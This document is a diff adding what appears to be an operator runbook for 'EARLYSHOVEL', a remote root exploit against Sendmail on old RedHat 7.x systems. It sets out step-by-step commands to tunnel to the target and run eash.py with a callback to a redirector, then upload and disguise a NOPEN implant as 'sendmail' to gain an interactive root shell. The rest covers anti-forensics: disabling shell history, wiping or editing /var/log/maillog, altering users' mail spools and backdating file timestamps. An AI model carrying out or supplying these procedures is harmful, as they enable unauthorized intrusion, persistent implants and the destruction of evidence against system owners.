@@ -1,0 +1,193 @@
+#########################################################
+# EARLYSHOVEL
+#########################################################
+### publicly known vulnerability
+### remote exploit available for linux RH7 running sendmail
+###Supported targets:
+###    "ASPRH73": ASP Linux 7.3 or RedHat 7.3 running Sendmail 8.11.6
+###   "RH70": RedHat 7.0 running Sendmail 8.11.0 
+###   "RH71": RedHat 7.1 running Sendmail 8.11.2
+###   "RH73": RedHat 7.3 running Sendmail 8.11.6
+### requires valid user name ( 7.1 and 7.3) 
+### may also require valid domain for (7.3)
+
+
+
+
+mx
+:%s/REDIRECTOR_IP/REDIRECTOR_IP/g
+:%s/TARGET_IP/TARGET_IP/g
+:%s/TARGET_OS/TARGET_OS/g
+:%s/USER_NAME/USER_NAME/g
+:%s/DOMAIN/DOMAIN/g
+:%s/RANDOM_PORT/RANDOM_PORT/g
+`x
+
+
+#banner mail
+-scan mail TARGET_IP
+
+# alternate way to banner
+
+##on pitch
+-tunnel
+l 2525 TARGET_IP 25
+
+###local scripted
+telnet 127.0.0.1 2525
+
+## after getting banner
+helo DOMAIN
+
+mail from: user@DOMAIN   # use random user name
+
+### may be getting rejected as spam???
+
+
+
+
+
+$ ./eash.py -?
+usage: 
+/current/bin/earlyshovel/eash.py [options]
+options
+   --atimeout seconds (default = 30)
+      Authentication timeout (in seconds)
+   --cip IPAddress (default = 127.0.0.1)
+      Callback IP address
+   --clport port
+      Local callback port
+   --cport port
+      Callback port
+   --ctimeout seconds (default = 30)
+      Callback timeout (in seconds)
+   --domain domainName
+      Domain name of sender
+   --exec filename
+      File to exec on successful upload
+   -? | --help
+      Print the usage message
+   --recipient emailAddress (default = root)
+      Email recipient
+   --target target
+      Target OS
+   --tip IPAddress (default = 127.0.0.1)
+      Target IP address
+   --tmpnam filename
+      Remote name of the uploaded file (of the form /tmp/fileXXXXXX)(def=filekdBtDF)
+   --tport port (default = 25)
+      Target port
+   --upload filename
+      File to upload
+Supported targets:
+   "ASPRH73": ASP Linux 7.3 or RedHat 7.3 running Sendmail 8.11.6
+   "RH70": RedHat 7.0 running Sendmail 8.11.0
+   "RH71": RedHat 7.1 running Sendmail 8.11.2
+   "RH72": RedHat 7.2 running Sendmail 8.11.6
+
+
+
+### REDIRECTION
+-tunnel
+l 2525 TARGET_IP 25
+r RANDOM_PORT
+
+### LOCAL WINDOW: UPLOADS NOPEN AUTOMATCALLY- as of VERSION 2.4.0
+cd /current/bin/earlyshovel
+./eash.py --tip 127.0.0.1 --tport 2525 --cip  REDIRECTOR_IP --cport RANDOM_PORT --recipient USER_NAME --target TARGET_OS --domain DOMAIN  --exec /current/bin/noclient --upload /current/up/morerats/noserver-3.0.3.1-i586.pc.linux.gnu.redhat-5.0
+      
+        -OR-
+
+### LOCAL WINDOW:MANUAL UPLOAD of NOPEN
+cd /current/bin/earlyshovel
+
+./eash.py --tip 127.0.0.1 --tport 2525 --cip REDIRECTOR_IP --cport RANDOM_PORT  --recipient USER_NAME --target TARGET_OS 
+
+./eash.py --tip 127.0.0.1 --tport 2525 --cip REDIRECTOR_IP --cport RANDOM_PORT  --recipient USER_NAME --target TARGET_OS --domain DOMAIN
+
+### you will get an interactive root shell
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+id
+pwd
+w
+
+
+# upload nopen as sendmail
+which uudecode uncompress
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+
+# if uudecode/uncompress exists:
+# LOCALLY
+
+cd /current/up
+cp /current/up/morerats/noserver-3.0.3.1-i586.pc.linux.gnu.redhat-5.0 sendmail
+compress sendmail
+uuencode sendmail.Z sendmail.Z > sendmail.Z.uu
+gedit sendmail.Z.uu
+
+# on TARGET in interactive window
+uudecode; ls -la
+copy/paste gedit contents into this window
+umcompress sendmail.Z
+ls -l
+chmod 700 sendmail
+PATH=. sendmail
+
+# from redirector
+-nstun TARGET_IP
+
+###END of MANUAL UPLOAD
+
+###CLEANUP
+#if nopen is uploaded automatically:
+-ls /tmp/filekdBtDF
+-rm /tmp/filekdBtDF
+
+
+# look where mail may be logged
+grep mail /etc/syslog.conf
+
+-tail /var/log/maillog
+
+#remove mail messages from file
+grep USER_NAME /var/log/maillog
+# do this;if grep will clean everything needed
+-gs grepout USER_NAME /var/log/maillog
+# if our logs entries are the only entries in file
+cat /dev/null > /var/log/maillog
+#change timestamp of file
+-touch /var/log/? /var/log/maillog
+
+#delete mail msgs from users mail dir: path may be different
+-lt /var/spool/mail/USER_NAME
+
+
+-get /var/spool/mail/USER_NAME
+
+#locally
+
+cp /current/down/hostname.IP/var/spool/mail/USER_NAME /current/up/t
+cd /current/up/t
+#remove email from t
+-put /current/up/t t
+
+#target window
+#if it looks good
+cat t > /var/spool/mail/USER_NAME
+# touch file to a "good" date
+touch -t YYMMDDHHMM.ss /var/spool/mail/USER_NAME
+
+
+#does user have a home dir
+grep USER_NAME /etc/passwd
+
+# look for users home dir and list it
+
+-lt ?/?/USER_NAME
+
+## look for .procmail or .forward files
+cat files if there....
+
